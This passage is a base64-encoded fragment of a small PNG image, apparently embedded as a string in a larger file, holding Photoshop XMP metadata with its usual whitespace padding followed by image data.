ICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5jcmVhdGVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6OWU1OTg3YmQtOTMzMy00MzA1LTlmMGMtYTdjZjVjZDE0MzM3PC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDE3LTAxLTIwVDA2OjA0OjU0KzAxOjAwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNS41IChNYWNpbnRvc2gpPC9zdEV2dDpzb2Z0d2FyZUFnZW50PgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgICAgPHJkZjpsaSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDphY3Rpb24+c2F2ZWQ8L3N0RXZ0OmFjdGlvbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0Omluc3RhbmNlSUQ+eG1wLmlpZDoyNzNhM2Y5ZS02OTQ2LTQ4NTUtOWE4Zi03NDIzZWZiNjdmYzg8L3N0RXZ0Omluc3RhbmNlSUQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDp3aGVuPjIwMTctMDUtMTlUMTY6Mzc6NTkrMDI6MDA8L3N0RXZ0OndoZW4+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpzb2Z0d2FyZUFnZW50PkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE1LjUgKE1hY2ludG9zaCk8L3N0RXZ0OnNvZnR3YXJlQWdlbnQ+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDpjaGFuZ2VkPi88L3N0RXZ0OmNoYW5nZWQ+CiAgICAgICAgICAgICAgIDwvcmRmOmxpPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5zYXZlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6aW5zdGFuY2VJRD54bXAuaWlkOmNmOWM3M2EwLTBiNjYtNDMwNS1hYzVlLTY3YWVjMGY5ZDI4Nzwvc3RFdnQ6aW5zdGFuY2VJRD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OndoZW4+MjAxNy0wNi0wMVQwNDowNjoyMCswMjowMDwvc3RFdnQ6d2hlbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OnNvZnR3YXJlQWdlbnQ+QWRvYmUgUGhvdG9zaG9wIENDIDIwMTUuNSAoTWFjaW50b3NoKTwvc3RFdnQ6c29mdHdhcmVBZ2VudD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmNoYW5nZWQ+Lzwvc3RFdnQ6Y2hhbmdlZD4KICAgICAgICAgICAgICAgPC9yZGY6bGk+CiAgICAgICAgICAgIDwvcmRmOlNlcT4KICAgICAgICAgPC94bXBNTTpIaXN0b3J5PgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICAgICA8dGlmZjpYUmVzb2x1dGlvbj43MjAwMDAvMTAwMDA8L3RpZmY6WFJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOllSZXNvbHV0aW9uPjcyMDAwMC8xMDAwMDwvdGlmZjpZUmVzb2x1dGlvbj4KICAgICAgICAgPHRpZmY6UmVzb2x1dGlvblVuaXQ+MjwvdGlmZjpSZXNvbHV0aW9uVW5pdD4KICAgICAgICAgPGV4aWY6Q29sb3JTcGFjZT42NTUzNTwvZXhpZjpDb2xvclNwYWNlPgogICAgICAgICA8ZXhpZjpQaXhlbFhEaW1lbnNpb24+MjAwPC9leGlmOlBpeGVsWERpbWVuc2lvbj4KICAgICAgICAgPGV4aWY6UGl4ZWxZRGltZW5zaW9uPjYyPC9leGlmOlBpeGVsWURpbWVuc2lvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCjw/eHBhY2tldCBlbmQ9InciPz7v57j5AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAHlBMVEX///////////////////////////////////////8V2MxSAAAACXRSTlPP1s7R0Neo1dgAcpriAAAAY0lEQVRYw+3ZwQnAIABD0WBP3cDeOoJruEA3cAiPbtCCIG7rFBEK/y/w7olKS7eMhSM+qtPe0OVHPmU/0nX6kRcEBAQEBAQEBAQEBAQEBAQEBAQE5P9I9iN9z/hc/cjQjkNgAbVq48Ls1bdvAAAAAElFTkSuQmCC", 